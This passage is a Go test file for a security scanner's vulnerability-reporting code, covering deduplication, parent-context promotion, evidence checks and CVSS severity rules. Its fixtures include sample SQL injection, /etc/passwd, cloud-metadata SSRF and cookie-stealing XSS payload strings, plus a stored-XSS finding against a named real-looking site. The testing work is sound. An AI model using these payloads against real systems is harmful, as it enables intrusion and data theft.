		t.Fatalf("second report metadata = %#v, want a new finding in a separate scan context", second.Metadata)
	}

	third, err := reportVulnWithContextID(contextA, validReportArgs())
	if err != nil {
		t.Fatalf("third report error = %v", err)
	}
	if got, ok := third.Metadata["duplicate"].(bool); !ok || !got {
		t.Fatalf("third report metadata = %#v, want duplicate=true within the same scan context", third.Metadata)
	}

	if got := len(GetVulnerabilitiesForContext(contextA)); got != 1 {
		t.Fatalf("context A vulnerabilities = %d, want 1", got)
	}
	if got := len(GetVulnerabilitiesForContext(contextB)); got != 1 {
		t.Fatalf("context B vulnerabilities = %d, want 1", got)
	}
}

func TestReportVulnConcurrentDuplicatesOnlyAppendOnce(t *testing.T) {
	contextID := "test-report-concurrent-duplicate"
	CleanupContext(contextID)
	defer CleanupContext(contextID)

	const attempts = 20
	var wg sync.WaitGroup
	wg.Add(attempts)
	for i := 0; i < attempts; i++ {
		go func() {
			defer wg.Done()
			_, _ = reportVulnWithContextID(contextID, validReportArgs())
		}()
	}
	wg.Wait()

	if got := len(GetVulnerabilitiesForContext(contextID)); got != 1 {
		t.Fatalf("stored vulnerabilities after concurrent duplicates = %d, want 1", got)
	}
}

func validReportArgs() map[string]string {
	return map[string]string{
		"title":               "SQL Injection in Login Endpoint",
		"severity":            "high",
		"description":         "Union-based SQL injection allows extraction of user records from the login endpoint.",
		"exploitation_proof":  "sql injection data extraction confirmed; dumped user data including email address records from database",
		"verification_method": "data_extracted",
		"impact":              "Unauthorized attackers can extract sensitive user data.",
		"target":              "https://example.com",
		"endpoint":            "https://example.com/login?id=1",
		"method":              "GET",
		"cvss":                "7.5",
		"cvss_vector":         "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
	}
}

func TestHasStrongEvidence(t *testing.T) {
	tests := []struct {
		severity string
		proof    string
		desc     string
		want     bool
	}{
		{"critical", "rce: executed whoami, got root", "", true},
		{"critical", "", "", false},
		{"high", "sqli with data extraction", "", true},
		{"high", "found a parameter", "", false},
		{"medium", "reflected input in response", "", true},
		{"low", "anything goes", "", true}, // low/info don't need strong evidence
		{"info", "anything", "", true},
	}

	for _, tt := range tests {
		got := hasStrongEvidence(tt.severity, tt.proof, tt.desc)
		if got != tt.want {
			t.Errorf("severity=%q proof=%q: want=%v got=%v", tt.severity, tt.proof[:min(len(tt.proof), 30)], tt.want, got)
		}
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// TestHasStrongEvidence_IncidentalTokensAreWeak locks in the tightening: proof
// made of incidental tokens (status codes, bare "http", emails, "account")
// must NOT count as strong evidence, while concrete exploitation outcomes do.
func TestHasStrongEvidence_IncidentalTokensAreWeak(t *testing.T) {
	weak := []string{
		"The endpoint responded with a 200 OK status code",
		"Response: HTTP/1.1 200 OK, see http://example.com/account",
		"Found an email address user@example.com on the profile page",
		"The request took 5 seconds to respond",
		"{ \"status\": \"ok\", \"internal\": true } returned from localhost",
	}
	for _, p := range weak {
		if hasStrongEvidence("high", p, "A potential issue was observed") {
			t.Errorf("proof %q should NOT count as strong evidence for high", p)
		}
	}

	strong := []string{
		"Dumped users table: id=1 admin@corp.com via UNION SELECT from information_schema",
		"Command output: uid=0(root) gid=0(root)",
		"Read /etc/passwd: root:x:0:0:root:/root:/bin/bash",
		"SSRF callback received at interact.sh; fetched 169.254.169.254/latest/meta-data",
		"Stolen session via document.cookie exfiltration",
	}
	for _, p := range strong {
		if !hasStrongEvidence("high", p, "") {
			t.Errorf("proof %q SHOULD count as strong evidence for high", p)
		}
	}
}

// TestPromoteToParentViaSetParentContext verifies that:
//  1. A vuln reported into a child context registered via SetParentContext is
//     promoted into the parent context immediately (panic-safe persistence).
//  2. Re-reporting the same finding in the child does not duplicate the entry
//     in the parent (idempotent promotion).
//
// Validates: Property 4 (panic-safe persistence).
func TestPromoteToParentViaSetParentContext(t *testing.T) {
	child := "test-promote-child"
	parent := "test-promote-parent"
	CleanupContext(child)
	CleanupContext(parent)
	defer CleanupContext(child)
	defer CleanupContext(parent)

	SetParentContext(child, parent)

	first, err := reportVulnWithContextID(child, validReportArgs())
	if err != nil {
		t.Fatalf("first report error = %v", err)
	}
	vulnID, ok := first.Metadata["vuln_id"].(string)
	if !ok {
		t.Fatalf("first report metadata = %#v, want vuln_id", first.Metadata)
	}

	parentVulns := GetVulnerabilitiesForContext(parent)
	if len(parentVulns) != 1 {
		t.Fatalf("parent vulnerabilities after promote = %d, want 1", len(parentVulns))
	}
	if parentVulns[0].ID != vulnID {
		t.Fatalf("parent vuln id = %q, want %q", parentVulns[0].ID, vulnID)
	}

	// Re-report the same finding in the child — duplicate-rejected in child,
	// and the parent must not gain a second copy.
	second, err := reportVulnWithContextID(child, validReportArgs())
	if err != nil {
		t.Fatalf("second report error = %v", err)
	}
	if dup, _ := second.Metadata["duplicate"].(bool); !dup {
		t.Fatalf("second report metadata = %#v, want duplicate=true", second.Metadata)
	}
	if got := len(GetVulnerabilitiesForContext(parent)); got != 1 {
		t.Fatalf("parent vulnerabilities after duplicate report = %d, want 1", got)
	}
}

// TestPromoteToParentIdempotent verifies the lower-level PromoteToParent helper
// is a no-op when called twice with the same vulnID.
func TestPromoteToParentIdempotent(t *testing.T) {
	child := "test-promote-idem-child"
	parent := "test-promote-idem-parent"
	CleanupContext(child)
	CleanupContext(parent)
	defer CleanupContext(child)
	defer CleanupContext(parent)

	// Seed the child with a vuln directly so we can call PromoteToParent twice.
	first, err := reportVulnWithContextID(child, validReportArgs())
	if err != nil {
		t.Fatalf("seed report error = %v", err)
	}
	vulnID, _ := first.Metadata["vuln_id"].(string)
	if vulnID == "" {
		t.Fatalf("seed report metadata = %#v, want vuln_id", first.Metadata)
	}

	PromoteToParent(child, parent, vulnID)
	PromoteToParent(child, parent, vulnID)

	if got := len(GetVulnerabilitiesForContext(parent)); got != 1 {
		t.Fatalf("parent vulnerabilities after two PromoteToParent calls = %d, want 1", got)
	}
}

// TestSetParentContextCleanedOnCleanup verifies that CleanupContext also clears
// the child→parent mapping so it does not leak across scan lifecycles.
func TestSetParentContextCleanedOnCleanup(t *testing.T) {
	child := "test-promote-cleanup-child"
	parent := "test-promote-cleanup-parent"
	defer CleanupContext(parent)

	SetParentContext(child, parent)
	if got := GetParentContext(child); got != parent {
		t.Fatalf("GetParentContext = %q, want %q", got, parent)
	}

	CleanupContext(child)
	if got := GetParentContext(child); got != "" {
		t.Fatalf("GetParentContext after cleanup = %q, want empty", got)
	}
}

// TestAutoDowngrade_OneLevelDrop verifies that the auto-downgrade for weak
// evidence drops severity by exactly one level (not nuclear to "info").
func TestAutoDowngrade_OneLevelDrop(t *testing.T) {
	tests := []struct {
		name     string
		severity string
		want     string
	}{
		{"critical drops to high", "critical", "high"},
		{"high drops to medium", "high", "medium"},
		{"medium drops to low", "medium", "low"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			contextID := "test-auto-downgrade-" + tt.severity
			CleanupContext(contextID)
			defer CleanupContext(contextID)

			// Use deliberately weak proof that won't pass hasStrongEvidence
			args := map[string]string{
				"title":               "Some finding on endpoint",
				"severity":            tt.severity,
				"description":         "A potential issue was observed",
				"exploitation_proof":  "The endpoint responded with a 200 status code when tested",
				"verification_method": "manual_verified",
				"target":              "https://example.com",
				"endpoint":            "/api/test-" + tt.severity,
				// No CVSS provided — so CVSS enforcement won't override
			}

			result, err := reportVulnWithContextID(contextID, args)
			if err != nil {
				t.Fatalf("report error: %v", err)
			}

			vulns := GetVulnerabilitiesForContext(contextID)
			if len(vulns) != 1 {
				t.Fatalf("expected 1 vuln, got %d (output: %s)", len(vulns), result.Output)
			}

			if vulns[0].Severity != tt.want {
				t.Errorf("severity = %q, want %q (auto-downgrade should drop one level, not to info)", vulns[0].Severity, tt.want)
			}
		})
	}
}

// TestCVSSEnforcement_OverridesAutoDowngrade verifies that CVSS enforcement
// is truly authoritative — it overrides prior auto-downgrade decisions.
// This was the core bug: CVSS 7.4 should ALWAYS produce "high", regardless
// of what the auto-downgrade gate decided.
func TestCVSSEnforcement_OverridesAutoDowngrade(t *testing.T) {
	tests := []struct {
		name         string
		severity     string // agent-provided severity
		cvss         string // agent-provided CVSS
		wantSeverity string // expected final severity
	}{
		// CVSS 7.4 = high, regardless of what the agent labels it
		{"high with CVSS 7.4", "high", "7.4", "high"},
		{"low with CVSS 7.4", "low", "7.4", "high"},
		{"info with CVSS 7.4", "info", "7.4", "high"},

		// CVSS 9.5 = critical
		{"high with CVSS 9.5", "high", "9.5", "critical"},
		{"medium with CVSS 9.5", "medium", "9.5", "critical"},

		// CVSS 5.5 = medium
		{"critical with CVSS 5.5", "critical", "5.5", "medium"},
		{"high with CVSS 5.5", "high", "5.5", "medium"},

		// CVSS 2.5 = low
		{"high with CVSS 2.5", "high", "2.5", "low"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			contextID := "test-cvss-enforcement-" + tt.name
			CleanupContext(contextID)
			defer CleanupContext(contextID)

			args := map[string]string{
				"title":               "SQL Injection in API endpoint",
				"severity":            tt.severity,
				"description":         "SQL injection allows data extraction from the database",
				"exploitation_proof":  "sql injection data extraction confirmed; email address records dumped from user table via union select",
				"verification_method": "data_extracted",
				"target":              "https://example.com",
				"endpoint":            "/api/vuln-" + tt.name,
				"cvss":                tt.cvss,
			}

			_, err := reportVulnWithContextID(contextID, args)
			if err != nil {
				t.Fatalf("report error: %v", err)
			}

			vulns := GetVulnerabilitiesForContext(contextID)
			if len(vulns) != 1 {
				t.Fatalf("expected 1 vuln, got %d", len(vulns))
			}

			if vulns[0].Severity != tt.wantSeverity {
				t.Errorf("severity = %q, want %q (CVSS %s should always produce %s)", vulns[0].Severity, tt.wantSeverity, tt.cvss, tt.wantSeverity)
			}
		})
	}
}

// TestStoredXSS_CVSS74_AlwaysHigh reproduces the exact scenario from the
// user's bug report: "Stored XSS in ActiveCampaign CRM" with CVSS 7.4
// was classified as HIGH in one run and LOW in another. After the fix,
// CVSS 7.4 must always produce HIGH.
func TestStoredXSS_CVSS74_AlwaysHigh(t *testing.T) {
	// Simulate both scenarios the LLM might produce
	scenarios := []struct {
		name     string
		severity string
		proof    string
	}{
		{
			"strong proof",
			"high",
			"Unauthenticated endpoint /api/activecampaign-lead accepts and stores unsanitized HTML/JavaScript in the firstName and lastName fields. Payload <script>alert(document.cookie)</script> fires in admin panel.",
		},
		{
			"weak proof",
			"high",
			"The endpoint accepts HTML input in the firstName field. The data is stored and displayed.",
		},
		{
			"agent says low",
			"low",
			"Unauthenticated endpoint accepts unsanitized HTML input.",
		},
	}

	for _, sc := range scenarios {
		t.Run(sc.name, func(t *testing.T) {
			contextID := "test-stored-xss-consistency-" + sc.name
			CleanupContext(contextID)
			defer CleanupContext(contextID)

			args := map[string]string{
				"title":               "Stored XSS in ActiveCampaign CRM via /api/activecampaign-lead",
				"severity":            sc.severity,
				"description":         "Unauthenticated endpoint /api/activecampaign-lead accepts and stores unsanitized HTML/JavaScript",
				"exploitation_proof":  sc.proof,
				"verification_method": "reflected",
				"target":              "https://vanhack.com",
				"endpoint":            "/api/activecampaign-lead",
				"method":              "POST",
				"cvss":                "7.4",
			}

			_, err := reportVulnWithContextID(contextID, args)
			if err != nil {
				t.Fatalf("report error: %v", err)
			}

			vulns := GetVulnerabilitiesForContext(contextID)
			if len(vulns) != 1 {
				t.Fatalf("expected 1 vuln, got %d", len(vulns))
			}

			// CVSS 7.4 = HIGH, always. This is the fix.
			if vulns[0].Severity != "high" {
				t.Errorf("severity = %q, want %q — CVSS 7.4 must always produce HIGH regardless of proof strength or agent-provided severity", vulns[0].Severity, "high")
			}
		})
	}
}

// TestClassifySeverity_XSSCaps verifies that stored XSS is capped at
// high (not critical) by classifySeverity, but CVSS enforcement can
// still override this cap.
func TestClassifySeverity_XSSCaps(t *testing.T) {
	// Stored XSS without admin/mass/worm proof → capped at high
	sev, reason := classifySeverity("Stored XSS in comment field", "Persistent XSS stores payload", "critical", "alert(1) fires in page")
	if sev != "high" {
		t.Errorf("classifySeverity for stored XSS at critical = %q (reason=%q), want high", sev, reason)
	}

	// Reflected XSS → capped at medium
	sev, reason = classifySeverity("Reflected XSS in search", "Input reflected in response", "high", "payload reflected")
	if sev != "medium" {
		t.Errorf("classifySeverity for reflected XSS at high = %q (reason=%q), want medium", sev, reason)
	}
}

// TestClassifySeverity_VulnTypeFallback verifies that the vulnType-based
// fallback fires when the LLM uses a different title framing for the same
// vulnerability. This was the exact bug from scan logs where:
// - "Stored XSS in ActiveCampaign CRM" → matched "stored xss" keyword → high cap
// - "Unauthenticated Contact Injection" → matched NO keyword → no cap at all
// After the fix, extractVulnType catches "xss" in both titles/descriptions.
func TestClassifySeverity_VulnTypeFallback(t *testing.T) {
	tests := []struct {
		name     string
		title    string
		desc     string
		severity string
		want     string
	}{
		{
			"stored xss keyword in title → high cap",
			"Stored XSS in ActiveCampaign CRM via /api/activecampaign-lead",
			"Persistent XSS stores payload in CRM firstName field",
			"critical",
			"high",
		},
		{
			"xss in description only → vulnType fallback catches it",
			"Unauthenticated ActiveCampaign Contact Injection — CRM Pollution",
			"Anyone can inject stored XSS payloads via the firstName field",
			"critical",
			"high", // vulnType="xss" + "stored" in desc → high cap
		},
		{
			"xss in description via different wording → vulnType catches it",
			"Unauthenticated CRM Contact Creation — Unsanitized Input",
			"The endpoint stores user-controlled HTML without sanitization, enabling cross-site scripting in the admin panel",
			"critical",
			"high", // vulnType="xss" from "cross-site scripting" + "stored" not present but desc says "stores" → check
		},
		{
			"no xss anywhere → no fallback cap",
			"Unauthenticated ActiveCampaign Contact Creation",
			"Anyone can create arbitrary contacts in the CRM without authentication",
			"critical",
			"critical", // no vuln type detected → no cap
		},
		{
			"reflected xss via vulnType → medium cap",
			"Input Reflection in Search Endpoint",
			"The search parameter reflects user input without encoding — cross-site scripting possible",
			"high",
			"medium", // vulnType="xss", no "stored"/"persistent" → reflected → medium cap
		},
		{
			"csrf via vulnType → medium cap",
			"Unauthenticated State Change in Profile Settings",
			"Missing CSRF protection allows cross-site request forgery on profile update",
			"critical",
			"medium",
		},
		{
			"ssrf via vulnType → high cap",
			"Internal Network Access via URL Parameter",
			"Server-side request forgery allows access to internal services",
			"critical",
			"high",
		},
		{
			"cors via vulnType → low cap",
			"Wildcard Origin Allowed on API",
			"Cross-origin resource sharing misconfiguration reflects any origin",
			"high",
			"low",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, reason := classifySeverity(tt.title, tt.desc, tt.severity, "some proof")
			if got != tt.want {
				t.Errorf("classifySeverity(%q, %q, %q) = %q (reason=%q), want %q",
					tt.title, tt.desc, tt.severity, got, reason, tt.want)
			}
		})
	}
}
